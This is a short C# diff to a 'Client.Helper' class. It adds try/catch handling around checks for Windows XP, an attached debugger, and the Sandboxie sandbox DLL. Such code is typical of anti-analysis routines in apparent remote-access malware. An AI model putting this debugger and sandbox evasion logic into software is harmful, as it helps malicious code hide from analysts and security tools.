@@ -42,10 +42,14 @@ namespace Client.Helper
 
         private static bool IsXP()
         {
-            if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
+            try
             {
-                return true;
+                if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
+                {
+                    return true;
+                }
             }
+            catch { }
             return false;
         }
 
@@ -77,16 +81,30 @@ namespace Client.Helper
         private static bool DetectDebugger()
         {
             bool isDebuggerPresent = false;
-            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
-            return isDebuggerPresent;
+            try
+            {
+                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+                return isDebuggerPresent;
+            }
+            catch
+            {
+                return isDebuggerPresent;
+            }
         }
 
         private static bool DetectSandboxie()
         {
-            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
-                return true;
-            else
+            try
+            {
+                if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+                    return true;
+                else
+                    return false;
+            }
+            catch
+            {
                 return false;
+            }
         }
 
 
